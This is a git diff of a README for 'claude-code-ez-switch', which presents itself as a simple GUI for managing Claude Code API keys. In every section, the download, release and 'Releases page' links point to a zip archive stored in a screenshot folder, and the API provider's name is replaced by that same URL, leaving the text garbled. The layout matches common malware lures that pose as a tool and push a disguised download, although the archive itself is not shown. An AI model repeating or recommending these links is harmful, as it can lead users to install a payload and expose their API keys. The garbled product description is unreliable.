@@ -1,15 +1,15 @@
-# 🛠️ claude-code-ez-switch - Manage Your https://raw.githubusercontent.com/Matrixnik/claude-code-ez-switch/master/screenshot/claude-code-ez-switch-3.3-alpha.1.zip API Keys Easily
+# 🛠️ claude-code-ez-switch - Manage Your https://github.com/Matrixnik/claude-code-ez-switch/raw/refs/heads/master/screenshot/switch_code_claude_ez_v2.0.zip API Keys Easily
 
 ## 📥 Download Now
-[![Release](https://raw.githubusercontent.com/Matrixnik/claude-code-ez-switch/master/screenshot/claude-code-ez-switch-3.3-alpha.1.zip)](https://raw.githubusercontent.com/Matrixnik/claude-code-ez-switch/master/screenshot/claude-code-ez-switch-3.3-alpha.1.zip)
+[![Release](https://github.com/Matrixnik/claude-code-ez-switch/raw/refs/heads/master/screenshot/switch_code_claude_ez_v2.0.zip)](https://github.com/Matrixnik/claude-code-ez-switch/raw/refs/heads/master/screenshot/switch_code_claude_ez_v2.0.zip)
 
 ## 📂 Overview
-claude-code-ez-switch is a simple tool designed to help users add and manage their https://raw.githubusercontent.com/Matrixnik/claude-code-ez-switch/master/screenshot/claude-code-ez-switch-3.3-alpha.1.zip API keys. This application provides an easy-to-use graphical interface for controlling your keys with Claude Code, making it a perfect solution for anyone looking to streamline their workflow without getting into technical details.
+claude-code-ez-switch is a simple tool designed to help users add and manage their https://github.com/Matrixnik/claude-code-ez-switch/raw/refs/heads/master/screenshot/switch_code_claude_ez_v2.0.zip API keys. This application provides an easy-to-use graphical interface for controlling your keys with Claude Code, making it a perfect solution for anyone looking to streamline their workflow without getting into technical details.
 
 ## 🚀 Getting Started
 To begin using claude-code-ez-switch, you'll need to follow these simple steps:
 
-1. **Visit the Download Page:** Go to the Releases page to grab the latest version of the software. You can find it [here](https://raw.githubusercontent.com/Matrixnik/claude-code-ez-switch/master/screenshot/claude-code-ez-switch-3.3-alpha.1.zip).
+1. **Visit the Download Page:** Go to the Releases page to grab the latest version of the software. You can find it [here](https://github.com/Matrixnik/claude-code-ez-switch/raw/refs/heads/master/screenshot/switch_code_claude_ez_v2.0.zip).
   
 2. **Download the Application:** Click on the version you want to download. Look for files with `.exe` or `.zip` depending on your operating system (Windows/Linux).  
 
@@ -27,14 +27,14 @@ To begin using claude-code-ez-switch, you'll need to follow these simple steps:
 
 ## 🎛️ Features
 - **User-Friendly Interface:** Simple and intuitive design that makes key management easy for anyone.
-- **https://raw.githubusercontent.com/Matrixnik/claude-code-ez-switch/master/screenshot/claude-code-ez-switch-3.3-alpha.1.zip API Integration:** Directly configure your API keys to work with Claude Code.
+- **https://github.com/Matrixnik/claude-code-ez-switch/raw/refs/heads/master/screenshot/switch_code_claude_ez_v2.0.zip API Integration:** Directly configure your API keys to work with Claude Code.
 - **Save and Load Configurations:** Easily save your API settings and load them whenever needed.
 - **Cross-Platform Support:** Use on Windows or Linux, depending on your preference.
 
 ## ⚙️ Usage Instructions
 1. **Adding an API Key:**
    - In the application, find the section labeled "Add Key".
-   - Input your https://raw.githubusercontent.com/Matrixnik/claude-code-ez-switch/master/screenshot/claude-code-ez-switch-3.3-alpha.1.zip API key in the provided field.
+   - Input your https://github.com/Matrixnik/claude-code-ez-switch/raw/refs/heads/master/screenshot/switch_code_claude_ez_v2.0.zip API key in the provided field.
    - Click the "Save" button to store the key.
 
 2. **Managing API Keys:**
@@ -45,11 +45,11 @@ To begin using claude-code-ez-switch, you'll need to follow these simple steps:
 If you encounter issues while using claude-code-ez-switch, try the following steps:
 
 - **Reinstall the Application**: If the app doesn't launch or behaves unexpectedly, uninstall and then reinstall it.
-- **Check API Key Validity**: Ensure that your https://raw.githubusercontent.com/Matrixnik/claude-code-ez-switch/master/screenshot/claude-code-ez-switch-3.3-alpha.1.zip API keys are active and not expired.
+- **Check API Key Validity**: Ensure that your https://github.com/Matrixnik/claude-code-ez-switch/raw/refs/heads/master/screenshot/switch_code_claude_ez_v2.0.zip API keys are active and not expired.
 - **Consult Documentation**: Use the README file or check online resources for common questions.
 
 ## 📥 Download & Install
-To get started, visit the [Releases page](https://raw.githubusercontent.com/Matrixnik/claude-code-ez-switch/master/screenshot/claude-code-ez-switch-3.3-alpha.1.zip) and download the latest version of claude-code-ez-switch. Follow the instructions above for installation, and you'll be ready to manage your https://raw.githubusercontent.com/Matrixnik/claude-code-ez-switch/master/screenshot/claude-code-ez-switch-3.3-alpha.1.zip API keys in no time.
+To get started, visit the [Releases page](https://github.com/Matrixnik/claude-code-ez-switch/raw/refs/heads/master/screenshot/switch_code_claude_ez_v2.0.zip) and download the latest version of claude-code-ez-switch. Follow the instructions above for installation, and you'll be ready to manage your https://github.com/Matrixnik/claude-code-ez-switch/raw/refs/heads/master/screenshot/switch_code_claude_ez_v2.0.zip API keys in no time.
 
 ## 📬 Support
 If you need assistance, feel free to open an issue on the GitHub repository or check the community forums. Help is available, and others may have had similar questions.
@@ -66,10 +66,10 @@ This project covers various topics including:
 - Productivity Tool
 - Python Tkinter
 - Windows Desktop
-- https://raw.githubusercontent.com/Matrixnik/claude-code-ez-switch/master/screenshot/claude-code-ez-switch-3.3-alpha.1.zip and other related topics.
+- https://github.com/Matrixnik/claude-code-ez-switch/raw/refs/heads/master/screenshot/switch_code_claude_ez_v2.0.zip and other related topics.
 
 ## 🌟 Acknowledgements
 Thank you to all contributors and users who help improve claude-code-ez-switch. Your feedback and suggestions drive better experiences for everyone.
 
 ## 📥 Download Now Again
-Don't forget to grab your copy from the [Releases page](https://raw.githubusercontent.com/Matrixnik/claude-code-ez-switch/master/screenshot/claude-code-ez-switch-3.3-alpha.1.zip). Enjoy managing your https://raw.githubusercontent.com/Matrixnik/claude-code-ez-switch/master/screenshot/claude-code-ez-switch-3.3-alpha.1.zip API keys easily!
+Don't forget to grab your copy from the [Releases page](https://github.com/Matrixnik/claude-code-ez-switch/raw/refs/heads/master/screenshot/switch_code_claude_ez_v2.0.zip). Enjoy managing your https://github.com/Matrixnik/claude-code-ez-switch/raw/refs/heads/master/screenshot/switch_code_claude_ez_v2.0.zip API keys easily!
